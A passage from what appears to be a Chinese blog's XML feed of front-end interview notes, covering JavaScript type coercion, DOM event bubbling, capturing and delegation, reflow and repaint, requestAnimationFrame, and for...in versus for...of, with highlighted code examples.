spellcheck="true">// false</span><span class="token function">Boolean</span><span class="token punctuation">(</span>undefined<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// false</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// false</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// false</span><span class="token function">Boolean</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// false</span></code></pre><h3 id="几道小题"><a href="#几道小题" class="headerlink" title="几道小题"></a>几道小题</h3><pre class=" language-js"><code class="language-js"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">{</span><span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">//"[object Object]"</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span>     <span class="token comment" spellcheck="true">//0</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">-</span><span class="token string">'1'</span><span class="token operator">+</span><span class="token number">1</span>  <span class="token comment" spellcheck="true">//1</span><span class="token string">'A'</span><span class="token operator">-</span><span class="token string">'B'</span>   <span class="token comment" spellcheck="true">//NaN</span></code></pre><h2 id="对象的键支持什么类型"><a href="#对象的键支持什么类型" class="headerlink" title="对象的键支持什么类型"></a>对象的键支持什么类型</h2><p><strong>字符串或symbol</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> person <span class="token operator">=</span> <span class="token punctuation">{</span>       name<span class="token punctuation">:</span> <span class="token string">'yd'</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token number">18</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题（五）</title>
      <link href="2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/"/>
      <url>2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>什么是事件冒泡，事件捕获，事件委托</li><li>重绘和回流</li><li>requestAnimationFrame 和 setTimeout</li><li>介绍一下前端路由</li><li>for in 和 for of</li><li>场景题：参数拼接</li><li>css可继承的属性</li><li>git有几种状态</li><li>简述 new 一个对象的过程</li><li>数据属性与访问器属性</li></ul><h2 id="什么是事件冒泡，事件捕获，事件委托"><a href="#什么是事件冒泡，事件捕获，事件委托" class="headerlink" title="什么是事件冒泡，事件捕获，事件委托"></a>什么是事件冒泡，事件捕获，事件委托</h2><ul><li><strong>事件冒泡</strong></li></ul><blockquote><p>当给父子元素的同一事件绑定方法的时候，触发子元素身上的事件，执行完毕之后，也会触发父级元素相同的事件，这种机制叫事件冒泡</p></blockquote><ul><li>事件捕获</li></ul><blockquote><p>给父子元素用绑定同一事件时，当触发子元素身上的事件时，先触发父元素，然后在传递给子元素，这种传播机制叫事件捕获；</p></blockquote><p>实际操作中，我们可以通过 element.addEventListener() 设置一个元素的事件模型为冒泡事件或者捕获事件。<br>先来看一下 addEventListener 函数的语法：</p><pre class=" language-js"><code class="language-js">element<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> listener<span class="token punctuation">,</span> useCapture<span class="token punctuation">)</span></code></pre><ul><li>type<br>监听事件类型的字符串</li><li>listener<br>事件监听回调函数，即事件触发后要处理的函数</li><li>useCapture<br>默认值false，表示事件冒泡；设为true时，表示事件捕获</li></ul><pre class=" language-html"><code class="language-html">       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">            <span class="token keyword">function</span> <span class="token function">sayBox3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'你点了最里面的box'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">sayBox2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'你点了最中间的box'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">sayBox1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'你点了最外面的box'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 事件监听，第三个参数是布尔值，默认false，false是事件冒泡，true是事件捕获</span>            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'box3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> sayBox3<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'box2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> sayBox2<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'box1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> sayBox1<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><ul><li>事件委托</li></ul><p>事件委托就是只指定一个事件处理程序，就可以管理某一类型的所有事件。</p><p><strong>为什么要用事件委托</strong></p><p>一般来说，dom需要有事件处理程序，我们都会直接给它设事件处理程序就好了，那如果是很多的dom需要添加事件处理呢？比如我们有100个li，每个li都有相同的click点击事件，可能我们会用for循环的方法，来遍历所有的li，然后给它们添加事件，那这么做会存在什么影响呢？</p><p>在JavaScript中，添加到页面上的事件处理程序数量将直接关系到页面的整体运行性能，因为需要不断的与dom节点进行交互，访问dom的次数越多，引起浏览器重绘与重排的次数也就越多，就会延长整个页面的交互就绪时间，这就是为什么性能优化的主要思想之一就是减少DOM操作的原因；如果要用事件委托，就会将所有的操作放到js程序里面，与dom的操作就只需要交互一次，这样就能大大的减少与dom的交互次数，提高性能；</p><p>每个函数都是一个对象，是对象就会占用内存，对象越多，内存占用率就越大，自然性能就越差了，比如上面的100个li，就要占用100个内存空间，如果用事件委托，那么我们就可以只对它的父级（如果只有一个父级）这一个对象进行操作，这样我们就需要一个内存空间就够了，是不是省了很多，自然性能就会更好。</p><p>如何实现呢？</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item-list<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>item1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>item2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>item3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>item4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">var</span> items <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'item-list'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//事件捕获实现事件代理</span>items<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'捕获：click '</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//事件冒泡实现事件代理</span>items<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'冒泡：click '</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h3 id="如何阻止冒泡和默认事件"><a href="#如何阻止冒泡和默认事件" class="headerlink" title="如何阻止冒泡和默认事件"></a>如何阻止冒泡和默认事件</h3><p>什么是冒泡事件？如在一个按钮是绑定一个”click”事件，那么”click”事件会依次在它的父级元素中被触发</p><pre class=" language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>div<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">let</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span>        <span class="token keyword">let</span> ul <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'ul'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">let</span> li <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'li'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        div<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        ul<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"ul"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        li<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// window.event? window.event.cancelBubble = true : e.stopPropagation();</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"li"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>阻止冒泡</p><p><strong>w3c的方法是e.stopPropagation()，IE则是使用e.cancelBubble = true</strong> ，兼容性写法如上，只会输出li</p><p>阻止默认事件</p><p><strong>w3c的方法是e.preventDefault()，IE则是使用window.event.returnValue = false;</strong></p><p>javascript的return false只会阻止默认行为</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://caibaojian.com/<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>testA<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>caibaojian.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">var</span> a <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"testA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span>onclick <span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>preventDefault<span class="token punctuation">)</span><span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    window<span class="token punctuation">.</span>event<span class="token punctuation">.</span>returnValue <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><ul><li><strong>DOM事件流有3个阶段：捕获阶段，目标阶段，冒泡阶段；三个阶段的顺序为：捕获阶段——目标阶段——冒泡阶段，这个顺序是固定的，我们上面实现的事件捕获或者事件冒泡，只是在这三个阶段的某个阶段去执行而已</strong></li><li><strong>当某个类型的<code>事件A</code>发生后，DOM会以–从Window对象开始依次降级，找到目标DOM对象，再从目标对象依次升级至Window–这样一个顺序，寻找各级的该事件(事件A)的事件监听。</strong>  </li></ul><h2 id="重绘和回流"><a href="#重绘和回流" class="headerlink" title="重绘和回流"></a>重绘和回流</h2><p>在页面加载时，浏览器把获取到的HTML代码解析成1个DOM树。 DOM Tree 和样式结构体组合后构建render tree，render tree中每个NODE都有自己的style，而且render tree不包含隐藏的节点，因为这些节点不会用于呈现，而且不会影响呈现的。</p><ul><li><a href="https://segmentfault.com/img/bVbaC2e?w=624&amp;h=289" target="_blank" rel="noopener">图示</a></li></ul><h3 id="什么是回流"><a href="#什么是回流" class="headerlink" title="什么是回流"></a>什么是回流</h3><p>当render tree中的一部分(或全部)因为元素的规模尺寸，布局，隐藏等改变而需要重新构建。这就称为回流(reflow)。每个页面至少需要一次回流，就是在页面第一次加载的时候，这时候是一定会发生回流的，因为要构建render tree。在回流的时候，浏览器会使渲染树中受到影响的部分失效，并重新构造这部分渲染树，完成回流后，浏览器会重新绘制受影响的部分到屏幕中，该过程成为重绘。</p><h3 id="什么是重绘"><a href="#什么是重绘" class="headerlink" title="什么是重绘"></a>什么是重绘</h3><p>当render tree中的一些元素需要更新属性，而这些属性只是影响元素的外观，风格，而不会影响布局的，比如background-color。则就叫称为重绘。</p><h3 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h3><ul><li>回流必将引起重绘，而重绘不一定会引起回流。比如：只有颜色改变的时候就只会发生重绘而不会引起回流</li><li>当页面布局和几何属性改变时就需要回流。比如：添加或者删除可见的DOM元素，元素位置改变，元素尺寸改变——边距、填充、边框、宽度和高度，内容改变</li></ul><h3 id="浏览器的优化机制"><a href="#浏览器的优化机制" class="headerlink" title="浏览器的优化机制"></a>浏览器的优化机制</h3><p>由于每次回流都会造成额外的计算消耗，因此大多数浏览器都会通过队列化修改并批量执行来优化回流过程。浏览器会将修改操作放入到队列里，直到过了一段时间或者操作达到了一个阈值，才清空队列。</p><h3 id="如何减少回流，重绘"><a href="#如何减少回流，重绘" class="headerlink" title="如何减少回流，重绘"></a>如何减少回流，重绘</h3><ul><li>直接避免：采用transform,opacity可以直接跳过主线程，用compositer线程完成</li><li>合并多次对DOM和样式的修改</li><li>将复杂的元素绝对定位，脱离文档流，否则回流的代价很高。</li></ul><ul><li><a href="https://www.jinjingxuan.com/2020/11/23/%E6%B5%8F%E8%A7%88%E5%99%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">浏览器渲染相关</a></li><li><a href="https://juejin.cn/post/6854573209791135757" target="_blank" rel="noopener">字节前端提前批面试题：触发了几次回流几次重绘</a></li></ul><h2 id="requestAnimationFrame-和-setTimeout"><a href="#requestAnimationFrame-和-setTimeout" class="headerlink" title="requestAnimationFrame 和 setTimeout"></a>requestAnimationFrame 和 setTimeout</h2><h3 id="（1）seTimeout实现动画："><a href="#（1）seTimeout实现动画：" class="headerlink" title="（1）seTimeout实现动画："></a>（1）seTimeout实现动画：</h3><p>利用seTimeout实现的动画在某些低端机上会出现卡顿、抖动的现象</p><p>　　<strong>原因一</strong>、setTimeout的执行时间并不是确定的。在Javascript中， setTimeout 任务被放进了异步队列中，只有当主线程上的任务执行完以后，才会去检查该队列里的任务是否需要开始执行，因此 setTimeout 的实际执行时间一般要比其设定的时间晚一些。</p><p>　　<strong>原因二</strong>、刷新频率受屏幕分辨率和屏幕尺寸的影响，因此不同设备的屏幕刷新频率可能会不同，而 setTimeout只能设置一个固定的时间间隔，这个时间不一定和屏幕的刷新时间相同。</p><p>　　上两种情况都会导致setTimeout的执行步调和屏幕的刷新步调不一致，从而引起丢帧现象。</p><p><strong>setTimeout的执行只是在内存中对图像属性进行改变，这个变化必须要等到屏幕下次刷新时才会被更新到屏幕上。如果两者的步调不一致，就可能会导致中间某一帧的操作被跨越过去，而直接更新下一帧的图像。</strong></p><h3 id="（2）requestAnimationFrame实现动画："><a href="#（2）requestAnimationFrame实现动画：" class="headerlink" title="（2）requestAnimationFrame实现动画："></a>（2）<strong>requestAnimationFrame实现动画：</strong></h3><p> requestAnimationFrame最大的优势是由系统来决定回调函数的执行时机。</p><p>　　如果屏幕刷新率是60Hz,那么回调函数就每16.7ms被执行一次，如果刷新率是75Hz，那么这个时间间隔就变成了1000/75=13.3ms，换句话说就是，requestAnimationFrame的步伐跟着系统的刷新步伐走。它能保证回调函数在屏幕每一次的刷新间隔中只被执行一次，这样就不会引起丢帧现象，也不会导致动画出现卡顿的问题。</p><p>js</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>animation <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> num<span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    animation <span class="token operator">=</span> <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//异步</span><span class="token punctuation">}</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">cancelAnimation</span><span class="token punctuation">(</span> animation <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="介绍一下前端路由"><a href="#介绍一下前端路由" class="headerlink" title="介绍一下前端路由"></a>介绍一下前端路由</h2><ul><li><a href="https://www.jinjingxuan.com/2020/09/11/%E5%89%8D%E7%AB%AF%E8%B7%AF%E7%94%B1-history%E6%A8%A1%E5%BC%8F%E5%92%8Chash%E6%A8%A1%E5%BC%8F/" target="_blank" rel="noopener">history模式和hash模式</a></li></ul><h2 id="for-in-和-for-of"><a href="#for-in-和-for-of" class="headerlink" title="for in 和 for of"></a>for in 和 for of</h2><p> 最直接的区别是：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/for...in" target="_blank" rel="noopener"><code>for...in</code></a> 语句以任意顺序迭代对象的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Enumerability_and_ownership_of_properties" target="_blank" rel="noopener">可枚举属性</a>。</li><li><code>for...of</code> 语句遍历<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Iterators_and_Generators#Iterables" target="_blank" rel="noopener">可迭代对象</a>定义要迭代的数据。<ul><li>包括 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Array" target="_blank" rel="noopener"><code>Array</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Map" target="_blank" rel="noopener"><code>Map</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Set" target="_blank" rel="noopener"><code>Set</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/String" target="_blank" rel="noopener"><code>String</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypedArray" target="_blank" rel="noopener"><code>TypedArray</code></a>，<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions_and_function_scope/arguments" target="_blank" rel="noopener">arguments</a> 对象等等</li></ul></li></ul><p>除此之外，对于for in的缺点</p><ol><li>索引是字符串型的数字，因而不能直接进行几何运算</li><li>遍历顺序可能不是实际的内部顺序</li><li>for in会遍历数组所有的可枚举属性，包括原型。例如的原型方法method和name属性</li></ol><blockquote><p>此外，<code>for ... in</code>是为遍历对象属性而构建的，不建议与数组一起使用，数组可以用<code>Array.prototype.forEach()</code>和<code>for ... of</code></p></blockquote><pre class=" language-js"><code class="language-js">arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> arr<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 输出</span><span class="token comment" spellcheck="true">// 01</span><span class="token comment" spellcheck="true">// 11</span><span class="token comment" spellcheck="true">// 21</span><span class="token comment" spellcheck="true">// 31</span></code></pre><p>相对于for of的缺点：</p><pre class=" language-js"><code class="language-js">Array<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>method<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">var</span> myArray<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>myArray<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">"数组"</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> index <span class="token keyword">in</span> myArray<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>myArray<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//0,1,2,method,name</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> value <span class="token keyword">of</span> myArray<span class="token punctuation">)</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//1,2,4</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span>    b<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token keyword">in</span> obj<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//1,2</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> j <span class="token keyword">of</span> obj<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//报错obj[Symbol.iterator] is not a function</span><span class="token punctuation">}</span></code></pre><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>当我们用for…of遍历对象时</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span> foo<span class="token punctuation">:</span> <span class="token number">123</span><span class="token punctuation">,</span> bar<span class="token punctuation">:</span> <span class="token number">456</span> <span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> item <span class="token keyword">of</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 报错 obj is not iterable</span></code></pre><p>Array,Set,Map都有Iterator属性，所以可以用for…of遍历</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>arr<span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>iterator<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// Array Iterator {} 其中还有next方法</span><span class="token keyword">const</span> iterator <span class="token operator">=</span> arr<span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>iterator<span class="token punctuation">]</span><span class="token 